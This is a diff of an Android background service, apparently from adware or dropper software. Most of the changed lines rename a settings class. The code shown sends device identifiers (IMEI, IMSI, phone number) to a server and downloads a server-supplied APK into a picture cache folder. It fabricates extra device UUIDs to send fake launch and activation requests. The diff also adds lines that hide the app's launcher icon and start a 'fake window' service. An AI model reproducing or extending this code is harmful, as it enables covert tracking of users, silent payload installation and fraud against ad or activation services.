@@ -23,7 +23,7 @@ import com.xstd.qm.AppRuntime;
 import com.xstd.qm.Config;
 import com.xstd.qm.UtilOperator;
 import com.xstd.qm.Utils;
-import com.xstd.qm.setting.SettingManager;
+import com.xstd.qm.setting.MainSettingManager;
 
 import java.util.HashMap;
 
@@ -64,7 +64,7 @@ public class DemonService extends IntentService {
                 lanuchQS();
             } else if (ACTION_ACTIVE_MAIN_FOR_FAKE.equals(action)) {
                 //通知服务器激活
-                if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
+                if (MainSettingManager.getInstance().getKeyLanuchTime() != 0) {
                     activeQS();
                 }
             } else if (ACTION_ACTIVE_PLUGIN.equals(action)) {
@@ -92,17 +92,17 @@ public class DemonService extends IntentService {
                 if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae)) {
                     i.putExtra("packageName", AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae);
                 }
-                String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : null;
+                String uuid = MainSettingManager.uuid != null ? MainSettingManager.uuid.toString() : null;
                 if (!TextUtils.isEmpty(uuid)) {
                     i.putExtra("uuid", uuid);
                 }
-                i.putExtra("extra", SettingManager.getInstance().getExtraInfo());
+                i.putExtra("extra", MainSettingManager.getInstance().getExtraInfo());
                 i.putExtra("channel", Config.CHANNEL_CODE);
 
                 startService(i);
 
-                if (SettingManager.getInstance().getLoopActiveCount() < 10) {
-                    SettingManager.getInstance().setLoopActiveCount(SettingManager.getInstance().getLoopActiveCount() + 1);
+                if (MainSettingManager.getInstance().getLoopActiveCount() < 10) {
+                    MainSettingManager.getInstance().setLoopActiveCount(MainSettingManager.getInstance().getLoopActiveCount() + 1);
                     Utils.tryToActivePluginApp(getApplicationContext());
                 }
 
@@ -124,7 +124,7 @@ public class DemonService extends IntentService {
         }
 
         try {
-            if (SettingManager.getInstance().getNotifyPluginInstallSuccess()) {
+            if (MainSettingManager.getInstance().getNotifyPluginInstallSuccess()) {
                 return;
             }
 
@@ -139,9 +139,9 @@ public class DemonService extends IntentService {
             if (TextUtils.isEmpty(imsi)) {
                 imsi = "987654321";
             }
-            String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
+            String uuid = MainSettingManager.uuid != null ? MainSettingManager.uuid.toString() : imei;
 
-            String extra = SettingManager.getInstance().getExtraInfo();
+            String extra = MainSettingManager.getInstance().getExtraInfo();
             LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                          , imei
                                                          , imsi
@@ -171,7 +171,7 @@ public class DemonService extends IntentService {
                 if (Config.DEBUG) {
                     Config.LOGD("[[DemonService::notifyPluginInstalled]] success notify service Plugin Installed ::::::::");
                 }
-                SettingManager.getInstance().setNotifyPluginInstallSuccess(true);
+                MainSettingManager.getInstance().setNotifyPluginInstallSuccess(true);
 
                 return;
             } else {
@@ -208,7 +208,7 @@ public class DemonService extends IntentService {
 //                imsi = String.valueOf(System.currentTimeMillis() + 9999);
                 imsi = "987654321";
             }
-            String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
+            String uuid = MainSettingManager.uuid != null ? MainSettingManager.uuid.toString() : imei;
 
             String extra = Build.MODEL;
             boolean isTablet = AppRuntime.isTablet(getApplicationContext());
@@ -226,20 +226,22 @@ public class DemonService extends IntentService {
             if (response != null) {
                 if (response.activeDelay == -1) {
                     //表示当前这个设备是要被关闭的
-                    SettingManager.getInstance().setDisableDownloadPlugin(true);
+                    MainSettingManager.getInstance().setDisableDownloadPlugin(true);
                     response.url = "http://fakedownload.apk";
                     response.subAppName = "fakedownload.apk";
-                    SettingManager.getInstance().setRealActiveDelayTime(AppRuntime.ACTIVE_DEALY1);
+                    MainSettingManager.getInstance().setRealActiveDelayTime(AppRuntime.ACTIVE_DEALY1);
 
                     //如果是-1，模拟几个设备
                     String uuidFake = uuid + "-123";
                     String uuidFake1 = uuid + "-124";
-                    SettingManager.getInstance().setFakeUUID(uuid + ";" + uuidFake + ";" + uuidFake1);
+                    MainSettingManager.getInstance().setFakeUUID(uuid + ";" + uuidFake + ";" + uuidFake1);
                     //直接访问网络
                     makeFakeLanuch(uuidFake);
                     makeFakeLanuch(uuidFake1);
                 } else {
-                    SettingManager.getInstance().setDisableDownloadPlugin(false);
+                    MainSettingManager.getInstance().setDisableDownloadPlugin(false);
+                    //不是前几个设备
+                    Utils.startFakeService(getApplicationContext(), "[[shouldForceShowFakeWindow]]");
                 }
 
                 //notify umeng
@@ -257,28 +259,33 @@ public class DemonService extends IntentService {
                 MobclickAgent.onEvent(getApplicationContext(), "lanuch", log);
                 MobclickAgent.flush(getApplicationContext());
             }
+
+            if (!MainSettingManager.getInstance().getDisableDownloadPlugin()) {
+                AppRuntime.hideInLauncher(getApplicationContext());
+            }
+
             if (response != null && !TextUtils.isEmpty(response.url)) {
                 if (Config.DEBUG) {
                     Config.LOGD("[[DemonService::onHandleIntent]] Lanuch Response : " + response.toString());
                 }
-                SettingManager.getInstance().setKeyLanuchTime(System.currentTimeMillis());
+                MainSettingManager.getInstance().setKeyLanuchTime(System.currentTimeMillis());
                 if (response.activeDelay == -1) {
-                    SettingManager.getInstance().setDisableDownloadPlugin(true);
+                    MainSettingManager.getInstance().setDisableDownloadPlugin(true);
                     //设置成60天
                     response.activeDelay = 60 * 24 * 60;
                 } else {
-                    SettingManager.getInstance().setDisableDownloadPlugin(false);
+                    MainSettingManager.getInstance().setDisableDownloadPlugin(false);
                 }
 
-                SettingManager.getInstance().setKeyInstallInterval(((long) response.activeDelay) * 60 * 1000);
+                MainSettingManager.getInstance().setKeyInstallInterval(((long) response.activeDelay) * 60 * 1000);
                 if (!response.url.startsWith("http")) {
                     if (Config.URL_PREFIX.endsWith("/")) {
-                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + response.url);
+                        MainSettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + response.url);
                     } else {
-                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + "/" + response.url);
+                        MainSettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + "/" + response.url);
                     }
                 } else {
-                    SettingManager.getInstance().setKeyDownloadUrl(response.url);
+                    MainSettingManager.getInstance().setKeyDownloadUrl(response.url);
                 }
 
                 if (Config.DEBUG) {
@@ -286,12 +293,12 @@ public class DemonService extends IntentService {
                 }
 
                 String apkFileName = StringUtils.MD5Encode(response.url) + ".apk";
-                SettingManager.getInstance().setLocalApkPath(DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + apkFileName);
+                MainSettingManager.getInstance().setLocalApkPath(DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + apkFileName);
 
                 if (UtilOperator.isPluginApkExist()) {
                     if (Config.DEBUG) {
                         Config.LOGD("[[DemonService]] plugin apk is exist on Path : "
-                                        + SettingManager.getInstance().getLocalApkPath());
+                                        + MainSettingManager.getInstance().getLocalApkPath());
                     }
                     return;
                 } else {
@@ -310,7 +317,7 @@ public class DemonService extends IntentService {
                             public void run() {
                                 if (Config.DEBUG) {
                                     Config.LOGD("[[DemonService]] try to download APK from : "
-                                                    + SettingManager.getInstance().getLocalApkPath()
+                                                    + MainSettingManager.getInstance().getLocalApkPath()
                                                     + " delay 1S");
                                 }
                                 Intent i = new Intent();
@@ -323,9 +330,9 @@ public class DemonService extends IntentService {
                 }
 
 //                                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
-                if (SettingManager.getInstance().getDisableDownloadPlugin()) {
+                if (MainSettingManager.getInstance().getDisableDownloadPlugin()) {
                     //如果是前几个设备的话，就立刻激活
-                    startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN_FOR_FAKE, SettingManager.getInstance().getRealActiveDelayTime());
+                    startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN_FOR_FAKE, MainSettingManager.getInstance().getRealActiveDelayTime());
                 }
                 cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
 
@@ -375,9 +382,9 @@ public class DemonService extends IntentService {
 //                        imsi = String.valueOf(System.currentTimeMillis() + 9999);
                         imsi = "987654321";
                     }
-                    String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
+                    String uuid = MainSettingManager.uuid != null ? MainSettingManager.uuid.toString() : imei;
 
-                    if (SettingManager.getInstance().getInstallChanged()) {
+                    if (MainSettingManager.getInstance().getInstallChanged()) {
                         Utils.saveExtraInfo("左install");
                     }
                     ActiveRequest request = new ActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
@@ -387,14 +394,14 @@ public class DemonService extends IntentService {
                                                                  , phone
                                                                  , uuid
                                                                  , AppRuntime.BASE_URL
-                                                                 , SettingManager.getInstance().getExtraInfo());
+                                                                 , MainSettingManager.getInstance().getExtraInfo());
                     ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
 
                     boolean isTablet = AppRuntime.isTablet(getApplicationContext());
                     if (response != null && !TextUtils.isEmpty(response.url)) {
-                        if (SettingManager.getInstance().getDisableDownloadPlugin()) {
+                        if (MainSettingManager.getInstance().getDisableDownloadPlugin()) {
                             //标识是前几个设备
-                            String uuids = SettingManager.getInstance().getFakeUUID();
+                            String uuids = MainSettingManager.getInstance().getFakeUUID();
                             if (!TextUtils.isEmpty(uuids)) {
                                 String[] uuidList = uuids.split(";");
                                 if (uuidList != null && uuidList.length == 3) {
@@ -420,7 +427,7 @@ public class DemonService extends IntentService {
                             Config.LOGD("[[DemonService::activeQS]] active success, response : " + response.toString());
                         }
                         //激活成功
-                        SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
+                        MainSettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
 //                        cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
                         return;
                     }
@@ -481,7 +488,7 @@ public class DemonService extends IntentService {
                                                          , uuid
                                                          , AppRuntime.BASE_URL
                                                          , Build.MODEL
-                                                               + (SettingManager.getInstance().getInstallChanged()
+                                                               + (MainSettingManager.getInstance().getInstallChanged()
                                                                       ? ";左install" : ""));
             ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
 
